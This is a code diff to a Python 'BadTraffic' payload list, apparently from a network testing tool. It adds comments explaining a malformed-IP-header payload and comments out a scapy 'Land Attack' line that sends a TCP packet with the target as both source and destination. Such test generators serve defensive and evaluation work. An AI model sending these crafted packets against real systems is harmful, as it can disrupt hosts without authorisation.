@@ -26,6 +26,8 @@ class BadTraffic():
             ])
 
         ### Malformed Traffic
+        # ihl=2 - Internet Header Length, it should be min 5 (so malformed)
+        # version=3 - IP Version, it should be 4 or 6 (so malformed)
         self.payloads.append([
             "Malformed Traffic",
             "scapy",
@@ -33,13 +35,14 @@ class BadTraffic():
             ""
             ])
 
-        ### Land Attack
-        self.payloads.append([
-            "Land Attack",
-            "scapy",
-            """send(IP(src="%target%",dst="%target%")/TCP(sport=135,dport=135), verbose=0)""",
-            ""
-            ])
+        ### [TO REMOVE] Land Attack
+        # attack from 1997, works on Windows XP SP2
+        # self.payloads.append([
+        #     "Land Attack",
+        #     "scapy",
+        #     """send(IP(src="%target%",dst="%target%")/TCP(sport=135,dport=135), verbose=0)""",
+        #     ""
+        #     ])
 
         return self.payloads
 
